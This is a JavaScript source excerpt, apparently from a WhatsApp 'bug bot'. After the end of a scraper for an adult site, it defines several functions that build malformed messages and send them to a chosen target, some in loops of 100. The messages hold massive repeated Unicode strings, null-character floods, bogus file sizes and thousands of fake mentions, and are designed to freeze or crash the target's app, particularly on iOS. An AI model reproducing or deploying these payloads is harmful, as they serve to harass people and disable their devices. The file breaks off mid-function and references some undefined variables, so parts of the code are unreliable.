            axios.get(`https://sfmcompile.club/page/${page}/?s=${encodeURIComponent(query)}`)
                .then((response) => {
                    const $ = cheerio.load(response.data);
                    const hasil = [];
                    $('#primary > div > div > ul > li > article').each((_, b) => {
                        hasil.push({
                            title: $(b).find('header > h2').text().trim(),
                            link: $(b).find('header > h2 > a').attr('href') || '',
                            category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', '').trim(),
                            share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text().trim(),
                            views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text().trim(),
                            type: $(b).find('source').attr('type') || 'image/jpeg',
                            video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src') || '',
                            video_2: $(b).find('video > a').attr('href') || ''
                        });
                    });
                    resolve(hasil);
                })
                .catch((error) => reject(error));
        });
    }
    
// ---- ( Function Start ) ----- \\
async function StukHard(sock, target) {
  const msg = {
    interactiveMessage: {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Peler Obito" + "ꦾ".repeat(100),
            },
            hasMediaAttachment: true,
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({ data: "contoh" }),
            buttons: [
              {
                name: "catalog_message",
                buttonParamsJson: JSON.stringify({
                  note: "FREEZ!!",
                }),
              },
              {
                name: "send_location",
                buttonParamsJson: JSON.stringify({
                  note: "FREEZ!!",
                }),
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  note: "FREEZ!!",
                }),
              },
              {
                name: "mpm",
                buttonParamsJson: JSON.stringify({
                  note: "FREEZ!!",
                }),
              },
              {
                name: "review_order",
                buttonParamsJson: JSON.stringify({
                  note: "Kuntul",
                }),
              },
            ],
          },
        },
      },
    },
  };

  console.log("success sending");

  try {
    const msg2 = await generateWAMessageFromContent(target, msg, {});

    await sock.relayMessage(target, msg2, {
      messageId: null,
      participant: { jid: target },
    });

    await sock.relayMessage(
      target,
      {
        newsletterAdminInviteMessage: {
          newsletterJid: "123456789@newsletter",
          newsletterName: "ꦾ".repeat(10),
          caption: "ꦽ".repeat(10),
          inviteExpiration: "909092899",
        },
      },
      {
        messageId: null,
        participant: { jid: target },
      }
    );
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
  }
}

async function videoBlank(sock, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Lolipop Xtream" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/Xatanicvxii",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function Localoid(sock, X, mention) {
  try {
    const MentionMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
              fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
              mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
              mimetype: "application/was",
              height: 9999999999,
              width: 999999999,
              directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
              fileLength: 9999999,
              pngThumbnail: Buffer.alloc(0),
              mediaKeyTimestamp: 1757601173,
              isAnimated: true,
              stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
              isAvatar: false,
              isAiSticker: false,
              isLottie: false
          }
        }
      }
    };

    await Promise.all([
      sock.relayMessage(target, MentionMsg.viewOnceMessage.message, {
        messageId: "",
        participant: { jid: X },
        userJid: X
      })
    ]);

    let ConnectionMsg2 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "~",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "payment_info",
                paramsJson: "\u0000".repeat(1045000),
          version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0")
      }
    );

    await sock.relayMessage("status@broadcast", ConnectionMsg2.message, {
      messageId: ConnectionMsg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (ConnectionMsg2) {
      await sock.relayMessage(
        target,
        {
          groupStatusMentionMessageV2: {
            message: {
              protocolMessage: {
                key: ConnectionMsg2.key,
                type: 25
              }
            }
          }
        },
        {}
      );
    }
  } catch (e) {
    console.error(e);
  }
}

async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/Serenhope",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 6000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function DelayHydra(sock, target, mention) {
    let Kontol = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        participant: target,
                        remoteJid: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1900 },
                                () => "1" + Math.floor(Math.random() * 500000) + "0@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 1814400000,
                            },
                        },
                        forwardedAiBotMessageInfo: {
                            botName: "META AI",
                            botJid: Math.floor(Math.random() * 9999).toString(),
                            creatorName: "ZayHere\\1337",
                        },
                    },
                    body: {
                        text: 'Zayy Cpe....' + new Date().toString() 
                    },
                    footer: {
                        text: 'Im Wanna Be Better..',
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{[".repeat(10000),
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },                                
                            {
                                name: "call_permission_request",
                                buttonParamsJson: JSON.stringify({
                                    status: true,
                                }),
                            },
                            {
                                name: "quick_reply",
                                buttonsParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(5000),
                                    id: 'ZayyBete'
                                }),
                            },
                            {
                                name: "cta_url",
                                buttonsParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(5000),
                                    id: "Gatau"
                                }),
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(5000),
                                    id: "ZayyGptJier"
                                }),
                            },
                            {
                                name: "payment_info",
                                buttonParamsJson: JSON.stringify({
                                        currency: "USD",
                                        total_amount: { value: 9000, offset: 100 },
                                        reference_id: "4P46GMY57GC",
                                        type: "physical-goods",
                                        order: {
                                            status: "pending",
                                            subtotal: { value: 9000, offset: 100 },
                                            order_type: "ORDER",
                                            items: [
                                                {
                                                    name: " Zay Come Back ",
                                                    amount: { value: 9000, offset: 100 },
                                                    quantity: 1,
                                                    sale_amount: { value: 9000, offset: 100 }
                                                }
                                            ]
                                        },
                                        payment_settings: [
                                            {
                                                type: "pix_static_code",
                                                pix_static_code: {
                                                    merchant_name: " ZayComebackX ",
                                                    key: "+99999999999",
                                                    key_type: "PHONE"
                                                },
                                            },
                                        ],
                                    }),
                                },
                            ],
                        },
                    },
                },  
            },
        };

        let Hydra = {
            interactiveMessage: {
                header: {
                    title: '\u0000',
                    hasMediaAttahment: true,
                },
                body: {
                    text: '𑜦𑜠'.repeat(10000),
                },
                footer: {
                    text: 'Zinging',
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [
                        { name: "cta_url", buttonParamsJson: "\u0003".repeat(1000) },
                        { name: "call_permission_request", buttonParamsJson: "\u0003".repeat(1000) },
                    ],
                },
                contextInfo: {
                    stanzaId: Math.floor(Math.random() * 9999).toString(),
                    isForwarded: true,
                    forwardingScore: 999,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from(
                            { length: 1900 },
                            () => "1" + Math.floor(Math.random() * 500000) + "0@s.whatsapp.net",
                        ),
                    ],
                    quotedMessage: {
                        interactiveMessage: {
                            body: {
                                text: 'Ui',
                            },
                            footer: {
                                text: '𑜦𑜠',
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{}",
                            },
                        },
                    },
                },
            },
        };

  const msg0 = generateWAMessageFromContent(target, {
    viewOnceMessage: { message: { interactiveMessage: Kontol.viewOnceMessage.message.interactiveMessage } },
  }, {});

  const msg2 = generateWAMessageFromContent(target, {
    interactiveMessage: Hydra.interactiveMessage
  }, {});


  for (const msg of [Kontol, Hydra]) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });
  }

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg1.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "SixSeven...67..." },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function iOSX(sock, X) {
   let msgx = generateWAMessageFromContent(X, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "",
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          jpegThumbnail: null,
          name: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(12000),
          address: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(12000),
          merchantUrl: `https://whatsapp-ios.${"𑇂𑆵𑆴𑆿".repeat(12000)}.pnx.id/`,
          inviteLinkGroupTypeV2: "DEFAULT",
        },
        hasMediaAttachment: true
       },
       body: {
        text: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(3000),
       },
       nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
      {
        name: "payment_method",
        buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
      }
    ],
},
       carouselMessage: {}
      }
     }
    }
   }), {});

  await sock.relayMessage("status@broadcast", msgx.message, {
    messageId: msgx.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
              },
            ],
          },
        ],
      },
    ],
  });
    
  let msgxx = generateWAMessageFromContent(X, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              orderMessage: {
                orderId: "0",
                itemCount: -999999,
                status: "SUCCESS",
                surface: "BUFFERS",
                orderDescription: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(12000),
                message: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?" + "𑇂𑆵𑆴𑆿".repeat(12000),
                orderTitle: "‼️⃟ ༚ 𝕏𝕽𝖆𝖑𝖉𝖟 ¿?",
                token: "92298382919191",
                thumbnail: { 
                  url: "https://files.catbox.moe/ykvioj.jpg" 
                },
                messageVersion: 1,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              name: "galaxy_message",
              messageParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}",
            },
          },
        },
      },
    }), {});
    
  await sock.relayMessage("status@broadcast", msgxx.message, {
    messageId: msgxx.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
              },
            ],
          },
        ],
      },
    ],
  });
};

async function JandaMuda(sock, target) {
  const cardss = [];

  for (let i = 0; i < 5; i++) {
    cardss.push({
      header: {
        hasMediaAttachment: true,
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/534859870_1051153396838314_2122100419717937309_n.enc?ccb=11-4&oh=01_Q5Aa2QFkDDvahAmTQB2rFSTjSTJV7uluYpY9jTpBENlcb7Sacw&oe=68CA3A18&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: "qbcHpQMuyE/rnd/4A3aLRth0hM6U7GWi3QBO0NAC6xQ=",
          fileLength: "9999999999999999999999",
          pageCount: 9999999999,
          mediaKey: "eOi7nJvxr+iO9GzptSFWSqsD9P+aIQ85D3CYBzcRvgI=",
          fileName: "OTAX IS HERE" + "ꦽ".repeat(5000),
          fileEncSha256: "pYwQbEFgkLdJwdiXMxX87oTBmb6zitzbjkAH2ydR4ac=",
          directPath: "/v/t62.7119-24/534859870_1051153396838314_2122100419717937309_n.enc?ccb=11-4&oh=01_Q5Aa2QFkDDvahAmTQB2rFSTjSTJV7uluYpY9jTpBENlcb7Sacw&oe=68CA3A18&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1755491865"
        }
      },
      body: { 
        text: "LOVE U" + "ꦽ".repeat(5000) 
      },
      nativeFlowMessage: {
        buttons: [
          {
